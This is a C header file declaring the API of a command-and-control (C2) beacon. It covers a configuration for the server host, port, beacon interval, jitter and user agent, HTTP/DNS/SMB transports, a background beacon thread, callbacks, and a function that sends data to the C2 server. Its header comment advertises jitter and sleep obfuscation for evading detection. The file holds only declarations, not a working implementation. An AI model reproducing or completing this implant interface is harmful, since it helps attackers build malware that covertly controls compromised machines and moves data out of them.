/**
 * @file beacon.h
 * @brief Async network beacon for C2 communication
 * 
 * Features:
 * - Asynchronous I/O with callbacks
 * - TLS 1.3 encryption
 * - Jitter and sleep obfuscation
 * - HTTP/DNS/SMB protocols
 * - Connection health monitoring
 */

#ifndef C2_BEACON_H
#define C2_BEACON_H

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Protocol types */
typedef enum {
    BEACON_PROTOCOL_HTTP,
    BEACON_PROTOCOL_HTTPS,
    BEACON_PROTOCOL_DNS,
    BEACON_PROTOCOL_SMB,
} beacon_protocol_t;

/* Beacon configuration */
typedef struct {
    beacon_protocol_t protocol;
    char server_host[256];
    uint16_t server_port;
    uint32_t interval_ms;        /* Base beacon interval */
    uint32_t jitter_percent;     /* Jitter percentage (0-100) */
    uint32_t timeout_ms;         /* Request timeout */
    bool use_tls;
    char user_agent[256];
    char session_id[64];
} beacon_config_t;

/* Beacon context (opaque) */
typedef struct beacon_ctx beacon_ctx_t;

/* Callback types */
typedef void (*beacon_callback_t)(beacon_ctx_t *ctx, void *user_data);
typedef void (*beacon_error_callback_t)(beacon_ctx_t *ctx, int error_code, const char *error_msg, void *user_data);
typedef void (*beacon_data_callback_t)(beacon_ctx_t *ctx, const uint8_t *data, size_t data_len, void *user_data);

/**
 * @brief Initialize beacon context
 * 
 * @param config Beacon configuration
 * @return beacon_ctx_t* Beacon context or NULL on failure
 */
beacon_ctx_t *beacon_init(const beacon_config_t *config);

/**
 * @brief Set beacon callbacks
 * 
 * @param ctx Beacon context
 * @param on_connect Called when connection established
 * @param on_data Called when data received from server
 * @param on_error Called on error
 * @param user_data User data passed to callbacks
 * @return int 0 on success, -1 on failure
 */
int beacon_set_callbacks(
    beacon_ctx_t *ctx,
    beacon_callback_t on_connect,
    beacon_data_callback_t on_data,
    beacon_error_callback_t on_error,
    void *user_data
);

/**
 * @brief Start async beacon loop
 * 
 * Runs in background, calls callbacks on events.
 * Returns immediately, beacon runs in separate thread.
 * 
 * @param ctx Beacon context
 * @return int 0 on success, -1 on failure
 */
int beacon_start(beacon_ctx_t *ctx);

/**
 * @brief Send data to C2 server
 * 
 * @param ctx Beacon context
 * @param data Data to send
 * @param data_len Data length
 * @return int 0 on success, -1 on failure
 */
int beacon_send(beacon_ctx_t *ctx, const uint8_t *data, size_t data_len);

/**
 * @brief Stop beacon loop
 * 
 * @param ctx Beacon context
 */
void beacon_stop(beacon_ctx_t *ctx);

/**
 * @brief Cleanup beacon context
 * 
 * @param ctx Beacon context
 */
void beacon_cleanup(beacon_ctx_t *ctx);

/**
 * @brief Get connection status
 * 
 * @param ctx Beacon context
 * @return true if connected, false otherwise
 */
bool beacon_is_connected(beacon_ctx_t *ctx);

/**
 * @brief Calculate next beacon time with jitter
 * 
 * @param base_interval_ms Base interval in milliseconds
 * @param jitter_percent Jitter percentage (0-100)
 * @return uint32_t Next beacon interval in milliseconds
 */
uint32_t beacon_calculate_jitter(uint32_t base_interval_ms, uint32_t jitter_percent);

#ifdef __cplusplus
}
#endif

#endif /* C2_BEACON_H */
